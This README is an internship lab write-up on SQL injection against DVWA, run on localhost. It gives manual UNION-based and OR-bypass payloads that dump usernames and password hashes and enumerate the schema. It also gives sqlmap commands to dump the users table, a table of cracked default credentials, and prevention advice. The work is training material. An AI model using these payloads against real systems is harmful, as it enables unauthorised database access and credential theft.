# Task 3: SQL Injection Testing on DVWA

## 📌 Objective
Perform SQL Injection attacks on DVWA (Damn Vulnerable Web Application) set to Low security level — both manually and using sqlmap — to extract sensitive data from the database.

## 🛠️ Tools Used
- **DVWA** — Deliberately vulnerable PHP/MySQL web application for practicing web attacks
- **sqlmap** — Automated SQL injection and database takeover tool
- **Browser Developer Tools** — For extracting session cookies

## 🔧 Lab Setup
DVWA was installed on a local Apache server with MariaDB as the backend database. Security level was set to **Low**, which means the application has zero input validation or parameterized queries — the user input goes directly into the SQL query.

```
Web Server: Apache 2.4.67 (Debian)
Database: MariaDB (MySQL >= 5.0.12)
Target URL: http://localhost/DVWA/vulnerabilities/sqli/
Security: Low
```

## 🎯 Phase 1: Manual SQL Injection

### What is SQL Injection?
SQL Injection is an attack where a user sends malicious SQL code through a web form. If the application doesn't properly sanitize the input, the malicious code gets executed by the database. This can allow attackers to steal data, bypass logins, modify records, or even take over the entire server.

### Payload 1: Normal Query
```
Input: 1
```
**What happened:** The application returned a single user (admin). This confirms the form is working and sends the input to the database.

### Payload 2: Bypass with OR Condition
```
Input: 1' OR '1'='1
```
**What happened:** Instead of returning one user, the database returned ALL 5 users (admin, Gordon, Hack, Pablo, Bob). The `OR '1'='1'` condition is always true, so the WHERE clause matches every row in the table.

### Payload 3: Extract Usernames & Password Hashes
```
Input: 1' UNION SELECT user, password FROM users#
```
**What happened:** The UNION operator combined our malicious query with the original one. The database returned all usernames along with their MD5 password hashes. The `#` at the end comments out the rest of the original query to prevent syntax errors.

### Payload 4: Database Version
```
Input: 1' UNION SELECT 1, @@version#
```
**What happened:** Returned the exact MySQL/MariaDB version running on the server.

### Payload 5: Current User & Database
```
Input: 1' UNION SELECT user(), database()#
```
**What happened:** Showed that we are connected as `dvwa@localhost` to the `dvwa` database.

### Payload 6: Table Enumeration
```
Input: 1' UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema=database()#
```
**What happened:** Listed all tables in the dvwa database (users, guestbook).

### Payload 7: Column Enumeration
```
Input: 1' UNION SELECT column_name, 1 FROM information_schema.columns WHERE table_name='users'#
```
**What happened:** Listed all columns in the users table (user_id, first_name, last_name, user, password, avatar, last_login, failed_login).

## 🤖 Phase 2: Automated Attack with sqlmap

### Step 1: Database Discovery
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>; security=low" --dbs
```
**Result:** sqlmap identified 2 databases — `dvwa` and `information_schema`.

sqlmap also detected:
- **Injection type:** time-based blind + UNION query
- **Backend DBMS:** MySQL >= 5.0.12 (MariaDB fork)
- **Web server:** Apache 2.4.67

### Step 2: Dump Users Table
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>; security=low" -D dvwa -T users --dump
```
**Result:** sqlmap extracted all 5 user records and automatically cracked the MD5 password hashes using a dictionary attack.

### Cracked Credentials

| User | Password Hash (MD5) | Cracked Password |
|------|---------------------|------------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

## 🔐 How to Prevent SQL Injection

| Method | Description |
|--------|-------------|
| **Parameterized Queries** | Use prepared statements (e.g., PDO in PHP) so user input is treated as data, never as SQL code |
| **Input Validation** | Validate and sanitize all user input on the server side |
| **Least Privilege** | The database user should only have the minimum permissions needed — no DROP or ALTER access |
| **WAF (Web Application Firewall)** | Deploy a WAF to detect and block common injection patterns |
| **Error Handling** | Never display raw database errors to users — they reveal table and column names |

## 📂 Files in This Directory
- `sql_injection_exploit.sh` — Automated exploit script with manual payloads and sqlmap commands
- `README.md` — This file
- `screenshots/` — Screenshots of manual injections and sqlmap output

## 👤 Author
**Jay Maniya**
Oasis Infobyte — Cybersecurity Internship (2026)
